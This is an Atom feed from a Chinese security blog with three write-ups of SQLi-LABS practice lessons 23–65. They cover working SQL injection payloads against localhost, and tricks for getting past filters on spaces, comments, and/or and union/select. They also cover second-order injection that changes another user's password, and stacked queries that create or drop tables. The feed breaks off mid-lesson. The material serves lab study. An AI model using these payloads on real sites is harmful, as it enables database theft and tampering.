<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Archimesan</title>
  
  <subtitle>思而不学则殆！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://archimesan.me/"/>
  <updated>2019-03-27T12:28:03.423Z</updated>
  <id>http://archimesan.me/</id>
  
  <author>
    <name>Archimesan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQLi-LABS 学习SQL注入4</title>
    <link href="http://archimesan.me/2018/06/30/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A54/"/>
    <id>http://archimesan.me/2018/06/30/SQLi-LABS-学习SQL注入4/</id>
    <published>2018-06-30T04:01:34.000Z</published>
    <updated>2019-03-27T12:28:03.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 54-less65 )<br><a id="more"></a></p><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>你需要在数据库中找到密钥</p><p><img src="20190327063957092.png" alt></p><p>百度翻译，就是说你最多只能尝试10次，10次之后就会自动重置随机表名，列名，数据表。</p><p><img src="20190327064003508.png" alt></p><p>单引号闭合发现不会报错</p><p><img src="20190327064009814.png" alt></p><p>应该是单引号闭合</p><p><img src="20190327064018960.png" alt></p><p>而且不是oder by注入</p><p><img src="20190327064028958.png" alt></p><p>3个查询字段</p><p><img src="20190327064035135.png" alt></p><p>爆表名<code>2xjj4aw1b1</code></p><p><img src="20190327064047739.png" alt></p><p>爆字段名<code>id,sessid,secret_XQ1M,tryy</code></p><p><img src="20190327064058973.png" alt></p><p>爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&gt;2955104571741a361ca41d687dd3649c&gt;Zi2thuqZHQCUsyS7coRR5cWu&gt;8&gt;</span><br></pre></td></tr></table></figure></p><p><img src="20190327064130018.png" alt></p><p><img src="20190327064145813.png" alt></p><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>同样不会报错，只能猜或者盲注。发现<code>数字,&#39;,&quot;,&#39;),&quot;)</code>闭合都不对,空格和注释也没有被过滤。</p><p><img src="20190327064221302.png" alt></p><p>看了答案第一次见到(变量)这种闭合方式，不是oder by注入</p><p><img src="20190327064230171.png" alt></p><p>那其余步骤就跟上一题一样了。</p><p><img src="20190327064239101.png" alt></p><p>爆表</p><p><img src="20190327064246562.png" alt></p><p>爆字段</p><p><img src="20190327064253031.png" alt></p><p>爆数据</p><p><img src="20190327064259751.png" alt></p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>不会报错，不是双引号闭合</p><p><img src="20190327064312656.png" alt></p><p>是(‘变量’)闭合</p><p><img src="20190327064321016.png" alt></p><p><img src="20190327064328792.png" alt></p><p>其余操作同上</p><p><img src="20190327064338454.png" alt></p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>双引号闭合</p><p><img src="20190327064349960.png" alt></p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>单引号报错，发现是单引号闭合</p><p><img src="20190327064400821.png" alt></p><p>可union不起作用,而且没有过滤select union</p><p><img src="20190327064407122.png" alt></p><p>看下源代码</p><p><img src="20190327064417921.png" alt></p><p>根据id值输出的是固定的数组，没有调用数据库中的数据。不过有报错信息，可以用报错函数。</p><p>爆表名</p><p><img src="20190327064428742.png" alt></p><p>爆字段名</p><p><img src="20190327064447597.png" alt></p><p>爆数据</p><p><img src="20190327064452290.png" alt><br><img src="20190327064503042.png" alt></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>报错显示数字型</p><p><img src="20190327064514513.png" alt></p><p>同样union没有作用，用报错函数，步骤同上</p><p><img src="20190327064520920.png" alt></p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>双引号报错显示(“变量”)闭合方式</p><p><img src="20190327064536204.png" alt></p><p>union不起作用，用报错函数</p><p><img src="20190327064544499.png" alt></p><p><img src="20190327064600031.png" alt></p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>单引号报错，((‘闭合’))</p><p><img src="20190327064608756.png" alt></p><p>同上</p><p><img src="20190327064617717.png" alt></p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>不会报错，可以尝试130次，肯定就是盲注了。</p><p><img src="20190327064629111.png" alt></p><p>不是双引号闭合</p><p><img src="20190327064634049.png" alt></p><p>不是括号双引号闭合</p><p><img src="20190327064645623.png" alt></p><p>是括号单引号闭合</p><p><img src="20190327064653117.png" alt></p><p><img src="20190327064701644.png" alt></p><p>然后写脚本盲注吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/index.php?id=1&apos;) and if(ascii(substr(database(),1,1))=99,1,sleep(5)) -- k</span><br></pre></td></tr></table></figure></p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>和Less-62一样，闭合方式变为单引号闭合</p><p><img src="20190327064806441.png" alt></p><p><img src="20190327064821745.png" alt></p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>又一个没见过的闭合方式(())</p><p><img src="20190327064832058.png" alt></p><p><img src="20190327064840295.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-64/index.php?id=1)) and if(ascii(substr(database(),1,1))=99,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>(“变量”)闭合</p><p><img src="20190327064917636.png" alt></p><p><img src="20190327064935128.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-65/?id=1&quot;) and if(ascii(substr(database(),1,1))=99,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.注入步骤，先看是否会报错，如果有报错直接就能看到是什么闭合方式，然后可以用union注入，updatexml、extractvalue函数显错注入或者select count(*),concat() from information_schmea.tables where table_schema=&apos; &apos; group by x。如果不会报错，看正确和错误页面显示信息是否一样，如果不一样可以用布尔盲注，时间盲注，如果一样的话只能用时间盲注。</span><br><span class="line">2.我认为最重要的步骤是在不会显错的情况下去判断闭合方式，有时候会因为引号或者括号没有闭合以及MySQL的隐式转换导致正确显示信息，这时候要用and 1=0 1=1或者 and if(1=1,sleep(5),null)去判断是否是真正的闭合方式。当然如果仍然判断不出来的话，继续注入，如果发现错误可能就是闭合方式判断错误</span><br><span class="line">3.需要尝试的闭合方式(),(()),&apos; &apos;,&quot; &quot;,(&apos; &apos;),(&quot; &quot;),((&apos; &apos;)),((&quot; &quot;)),数字型</span><br><span class="line">4.当引号被转以尝试宽字节注入，注释被过滤就闭合后面多出来的闭合符号，空格被过滤尝试%a0,/**/，加括号等方式，and，or被过滤，用aandnd和oorr代替，或者用逻辑运算符||和&amp;&amp;(%26%26),</span><br><span class="line">5.union,select被过滤，可以用大小写绕过，还有一种是union和select在一起的时候会被过滤</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;SQLi-LABS 学习SQL注入(less 54-less65 )&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="sql注入" scheme="http://archimesan.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQLi-LABS 学习SQL注入3</title>
    <link href="http://archimesan.me/2018/06/20/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A53/"/>
    <id>http://archimesan.me/2018/06/20/SQLi-LABS-学习SQL注入3/</id>
    <published>2018-06-20T04:01:34.000Z</published>
    <updated>2019-03-27T12:27:47.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 39-less53 )<br><a id="more"></a></p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>单引号闭合根据报错发现是数字型注入</p><p><img src="20190327062412584.png" alt></p><p>看源码跟less-38一样，都是堆叠注入，只是单引号闭合变为数字型了。</p><p><img src="20190327062420712.png" alt></p><p>另外分号后面的语句显示的结果是显示不出来的</p><p><img src="20190327062516177.png" alt></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>与Less38和Less39一样，就是闭合方式变为(‘变量’)，而且不会报错，需要用盲注猜测闭合方式</p><p><img src="20190327062616222.png" alt></p><p>不是单引号和双引号闭合</p><p><img src="20190327062652968.png" alt></p><p>是括号加单引号闭合</p><p><img src="20190327062709551.png" alt></p><p>同样可以用堆叠注入</p><p><img src="20190327062721826.png" alt></p><p><img src="20190327062743049.png" alt></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>同样是堆叠注入，不会报错，变为数字型注入。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>单引号闭合绕过</p><p><img src="20190327062804093.png" alt></p><p>源码中过滤了user，没有过滤password</p><p><img src="20190327062817772.png" alt></p><p>由于源码中仍然有</p><p><img src="20190327062827780.png" alt></p><p>所以可以继续使用堆叠注入,创建一个等于users的text2表，</p><p><img src="20190327062836403.png" alt></p><p><img src="20190327062850076.png" alt></p><p>当然更改密码页面也有一个之前用过的漏洞就不再写了</p><p><img src="20190327062858624.png" alt></p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>单引号报错</p><p><img src="20190327062924941.png" alt></p><p><img src="20190327062934323.png" alt></p><p>以为是数字型注入，发现进不去。最后发现是括号加单引号闭合</p><p><img src="20190327062934323.png" alt></p><p>其余等同Less-42<br>这样他会报错 ‘ ‘</p><p><img src="20190327063003482.png" alt></p><p><img src="20190327063010708.png" alt></p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这里和42其实相差不多，只不多这里没有了报错，但是注入语句还是一样的<br>直接就进去了</p><p><img src="20190327063023143.png" alt></p><p>多试几种闭合方式，如果不行就用布尔盲注。</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>依然是堆叠注入，这也跟前面的一样，就是不会报错了，各种尝试就好了</p><p><img src="20190327063042646.png" alt></p><h2 id="Less-46-ORDER-BY-Error-Numeric（第46节：GET-基于错误-数字型-ORDER-BY-从句）"><a href="#Less-46-ORDER-BY-Error-Numeric（第46节：GET-基于错误-数字型-ORDER-BY-从句）" class="headerlink" title="Less - 46 ORDER BY-Error-Numeric（第46节：GET - 基于错误 - 数字型 - ORDER BY 从句）"></a>Less - 46 ORDER BY-Error-Numeric（第46节：GET - 基于错误 - 数字型 - ORDER BY 从句）</h2><p>发现标题变了</p><p><img src="20190327063050233.png" alt></p><p>看一下源码，发现语句变为<code>select * from users order by $id;</code>,也就是输进去的id值是对应的那一列排序。</p><p><img src="20190327063122357.png" alt></p><p>sort=1</p><p><img src="20190327063131787.png" alt></p><p>sort=1’,数字型注入</p><p><img src="20190327063141866.png" alt></p><p><code>select * from tablename order by id desc:</code>根据id字段按照降序排列，从大到小<br><code>select * from tablename order by id asc:</code>根据id字段按照升序排列，从小到大<br>asc 按升序排列<br>desc 按降序排列<br>可以用sort=1 desc和sort=1 asc来判断是否存在oder by 注入</p><p><img src="20190327063205252.png" alt></p><p>这道题有报错信息，可以用updatexml报错函数，盲注也可以</p><p><img src="20190327063213175.png" alt></p><p>extractvalue函数当然也可以</p><p><img src="20190327063220924.png" alt></p><p>然后用select语句替换concat就可以查询想要的信息。<br>盲注,两个and，前两个条件只要有一个条件是false就不会运行if语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and if(1=1, sleep(1), null)</span><br><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)</span><br><span class="line">http://localhost/sqli-lab/Less-46/index.php?sort=1 and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/zyz511919766/article/details/42241211" target="_blank" rel="noopener">关于MySQL的SLEEP(N)函数</a></p><h2 id="Less-47-ORDER-BY-Clause-Error-Single-quote（第47节：ORDER-BY-从句-基于错误-单引号-）"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote（第47节：ORDER-BY-从句-基于错误-单引号-）" class="headerlink" title="Less - 47 ORDER BY Clause-Error-Single quote（第47节：ORDER BY 从句 - 基于错误-单引号 ）"></a>Less - 47 ORDER BY Clause-Error-Single quote（第47节：ORDER BY 从句 - 基于错误-单引号 ）</h2><p>单引号报错，知道是单引号闭合</p><p><img src="20190327063401344.png" alt></p><p>desc正确判断是order by注入</p><p><img src="20190327063409976.png" alt></p><p>其余同上</p><h2 id="Less-48-ORDER-BY-Clause-Blind-based（第48节：ORDER-BY-从句-基于盲注-）"><a href="#Less-48-ORDER-BY-Clause-Blind-based（第48节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 48 ORDER BY Clause Blind based（第48节：ORDER BY 从句 基于盲注 ）"></a>Less - 48 ORDER BY Clause Blind based（第48节：ORDER BY 从句 基于盲注 ）</h2><p>order by注入，没有报错信息</p><p><img src="20190327063430134.png" alt></p><p>盲注<code>id=1&#39;,1&quot;,1&#39;),1&quot;,1</code></p><p><img src="20190327063441343.png" alt></p><p>发现是数字型注入。<br>然后用报错函数或者盲注</p><h2 id="Less-49-ORDER-BY-Clause-Blind-based（第49节：ORDER-BY-从句-基于盲注-）"><a href="#Less-49-ORDER-BY-Clause-Blind-based（第49节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 49 ORDER BY Clause Blind based（第49节：ORDER BY 从句 基于盲注 ）"></a>Less - 49 ORDER BY Clause Blind based（第49节：ORDER BY 从句 基于盲注 ）</h2><p>依然不会报错，盲注发现是单引号闭合</p><p><img src="20190327063456653.png" alt></p><p>然后用报错函数或盲注</p><h2 id="Less-50-ORDER-BY-Clause-Blind-based（第50节：ORDER-BY-从句-基于盲注）"><a href="#Less-50-ORDER-BY-Clause-Blind-based（第50节：ORDER-BY-从句-基于盲注）" class="headerlink" title="Less - 50 ORDER BY Clause Blind based（第50节：ORDER BY 从句 基于盲注）"></a>Less - 50 ORDER BY Clause Blind based（第50节：ORDER BY 从句 基于盲注）</h2><p>desc,asc判断是order by注入，单引号报错，是数字型</p><p><img src="20190327063508020.png" alt></p><p>然后用报错函数或盲注</p><h2 id="Less-51-ORDER-BY-Clause-Blind-based（第51节：ORDER-BY-从句-基于盲注-）"><a href="#Less-51-ORDER-BY-Clause-Blind-based（第51节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 51 ORDER BY Clause Blind based（第51节：ORDER BY 从句 基于盲注 ）"></a>Less - 51 ORDER BY Clause Blind based（第51节：ORDER BY 从句 基于盲注 ）</h2><p>desc,asc判断是order by注入，单引号报错，是单引号闭合desc,asc判断是order by注入</p><p><img src="20190327063522353.png" alt></p><p>报错函数或盲注</p><p><img src="20190327063532758.png" alt></p><p>怎么感觉跟前面一摸一样，看了下源代码发现Less50和Less51都有</p><p><img src="20190327063539568.png" alt></p><p>这个函数，可以进行堆叠注入</p><p><img src="20190327063547972.png" alt></p><p>比如删除text2表</p><p><img src="20190327063555312.png" alt></p><h2 id="Less-52-ORDER-BY-Clause-Blind-based（第52节：ORDER-BY-从句-基于盲注-）"><a href="#Less-52-ORDER-BY-Clause-Blind-based（第52节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 52 ORDER BY Clause Blind based（第52节：ORDER BY 从句 基于盲注 ）"></a>Less - 52 ORDER BY Clause Blind based（第52节：ORDER BY 从句 基于盲注 ）</h2><p>单双引号不会报错，盲注判断为数字型</p><p><img src="20190327063610172.png" alt></p><p>源代码依然有</p><p><img src="20190327063620640.png" alt></p><p>可以进行堆叠注入，其余跟51差不多。</p><h2 id="Less-53-ORDER-BY-Clause-Blind-based（第53节：ORDER-BY-从句-基于盲注-）"><a href="#Less-53-ORDER-BY-Clause-Blind-based（第53节：ORDER-BY-从句-基于盲注-）" class="headerlink" title="Less - 53 ORDER BY Clause Blind based（第53节：ORDER BY 从句 基于盲注 ）"></a>Less - 53 ORDER BY Clause Blind based（第53节：ORDER BY 从句 基于盲注 ）</h2><p>不显示报错信息，盲注发现为单引号闭合</p><p><img src="20190327063647644.png" alt></p><p>同样可以进行堆叠注入，其他同前几道题。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;SQLi-LABS 学习SQL注入(less 39-less53 )&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="sql注入" scheme="http://archimesan.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQLi-LABS 学习SQL注入2</title>
    <link href="http://archimesan.me/2018/06/10/SQLi-LABS-%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A52/"/>
    <id>http://archimesan.me/2018/06/10/SQLi-LABS-学习SQL注入2/</id>
    <published>2018-06-10T04:01:34.000Z</published>
    <updated>2019-03-27T12:27:26.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>SQLi-LABS 学习SQL注入(less 23-less38 )<br><a id="more"></a></p><h2 id="less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="less 23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>less 23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h2><p>先单引号让他报错</p><p><img src="20190327045419933.png" alt></p><p>可以知道是单引号闭合。<br>然后发现–和#都被过滤了</p><p><img src="20190327045429782.png" alt></p><p>那么就只能用闭合后面引号的方法，根据报错可以知道语句为<code>id=&#39;$ID&#39; limit 0,1</code><br>那么可以这样闭合<code>id=&#39;1&#39; or &#39;1&#39;=&#39;1&#39; limit 0,1</code><br>或者是<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39; limit 0,1</code></p><p><img src="20190327045454482.png" alt></p><h2 id="less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="less-24 - Second Degree Injections Real treat -Store Injections (二次注入)"></a>less-24 - Second Degree Injections Real treat -Store Injections (二次注入)</h2><p>这是一个完整的注册登陆以及改密网站</p><p><img src="20190327045508132.png" alt></p><p>真正有跟数据库交互的就<code>login_create.php，login.php，pass_change.php</code>这三个文件</p><p><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">PHP mysql_real_escape_string() 函数</a></p><p>login.php</p><p><img src="20190327045626658.png" alt></p><p>login_create.php</p><p><img src="20190327045638450.png" alt></p><p>pass_change.php</p><p><img src="20190327045645779.png" alt><br><img src="20190327045654819.png" alt></p><p>发现只有<code>$_SESSION[&quot;username&quot;]</code>没有被过滤,这个SQL语句是用来更改密码的，而且<code>mysql_real_escape_string()</code>函数只会过滤以下字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>而注释是不会过滤掉的，我们可以注册一个包含注释符号的username，然后用这个username更改密码的时候会被注入到update语句中，更改注释前面的用户名的密码。</p><p><img src="20190327045804251.png" alt></p><p>比如我们想更改用户名为Dummy的密码，我们可以注册一个<code>username=Dummy&#39; -- k</code></p><p><img src="20190327045813914.png" alt></p><p>然后登陆更改密码为456</p><p><img src="20190327045826082.png" alt></p><p>而你会发现Dummy的密码变为了456，而<code>Dummy&#39; -- k</code>的密码还是123</p><p><img src="20190327045838396.png" alt></p><p>可能有人会说注册的时候不是被过滤了单引号吗。<br>我们<code>admin&#39; --</code>变成了<code>admin&#39; --</code>,还是正常闭合了，但是存进数据库的时候他依旧是一个单引号。（转义只是暂时在这里使它失去了单引号的作用，但它还是表示单引号）</p><p><img src="20190327045900944.png" alt></p><h2 id="less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="less 25 Trick with OR &amp; AND (过滤了or和and)"></a>less 25 Trick with OR &amp; AND (过滤了or和and)</h2><p>单引号报错</p><p><img src="20190327045924719.png" alt></p><p>发现是单引号闭合，注释也正常</p><p><img src="20190327045932126.png" alt></p><p>发现被过滤了and和or</p><p><img src="20190327045939365.png" alt></p><p><img src="20190327045947986.png" alt></p><p><a href="http://www.cnblogs.com/hubqin/p/6749433.html" target="_blank" rel="noopener">正则表达式模式修饰符</a><br>开了 i 模式不能用大小写绕过。</p><p><img src="20190327050147950.png" alt></p><p>我们可以用&amp;&amp;代替and，||代替or。</p><p><img src="20190327050154606.png" alt></p><p><img src="20190327050204252.png" alt></p><p>&amp;要换成%26url编码</p><p>双写也是可以的，因为他只过滤一次。</p><p><img src="20190327050214042.png" alt></p><p><img src="20190327050234672.png" alt></p><p>这道题用union也是可以的。</p><h2 id="less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）"><a href="#less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）" class="headerlink" title="less 25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）"></a>less 25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）</h2><p>跟less25一样只不过错误信息被屏蔽了。and和or也被过滤了。而注释没有被过滤</p><p><img src="20190327050302213.png" alt></p><p><img src="20190327050310243.png" alt></p><p>发现是数字型注入</p><p><img src="20190327050320968.png" alt></p><p>延时注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 %26%26 if(length(database)=8,1,sleep(5))</span><br></pre></td></tr></table></figure></p><p>联合查询</p><p><img src="20190327050458206.png" alt></p><h2 id="less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="less 26 Trick with comments and space (过滤了注释和空格的注入)"></a>less 26 Trick with comments and space (过滤了注释和空格的注入)</h2><p>通过输入<code>and1,or1,--1,/*1,/1,1,1&#39; &#39; &#39; &#39;</code></p><p><img src="20190327050458206.png" alt></p><p>发现被过滤了and，or，单行多行注释，/ ,空格，没有过滤单引号。</p><p><img src="20190327050533405.png" alt></p><p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</span><br></pre></td></tr></table></figure></p><p><img src="20190327050551928.png" alt></p><p>查数据库名</p><p><img src="20190327050558950.png" alt></p><p>查列名，不要忘记information中的or被过滤了</p><p><img src="20190327050605517.png" alt></p><p><img src="20190327050612804.png" alt></p><p>查字段</p><p><img src="20190327050619364.png" alt></p><p>查数据，不要忘了password中的or</p><p><img src="20190327050629773.png" alt></p><h2 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h2><p>跟25的区别是不会报错，闭合方式变为(‘变量’)。</p><p><img src="20190327050651495.png" alt></p><h2 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。</p><p><img src="20190327050744454.png" alt></p><p>id=0,等于-1的话负号被过滤掉还是会显示union前面的数据，不会显示后面的数据。用where ‘1’=’1’闭合后面的双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27/?id=0&apos;%a0UnIon%a0SeLect%a01,group_concat(username,password,0x3a),3%a0from%a0users%a0where%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="20190327050924299.png" alt></p><h2 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h2><p>这个跟less 27的区别是不会显示报错语句，还是个双引号闭合方式。所以关键的是去确认他的闭合方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; &apos;,union1,UnIon1,select1,SeLect1,</span><br></pre></td></tr></table></figure></p><p>判断出过滤了注释、select、union和空格，没有过滤and和or，以及可以用大小写绕过。当我们用单引号闭合的时候显示的是正确的</p><p><img src="20190327050957810.png" alt></p><p>and 1=0依然显示正确，说明不是单引号闭合</p><p><img src="20190327051004510.png" alt></p><p>而and 1=1双引号显示正确，and 1=0双引号显示错误。初步确定是双引号闭合</p><p><img src="20190327051021350.png" alt></p><p>基本可以确定是双引号闭合</p><p><img src="20190327051029149.png" alt></p><p>其他操作同less 27</p><p><img src="20190327051039633.png" alt></p><h2 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=and1,or1,--1,1&apos; &apos; 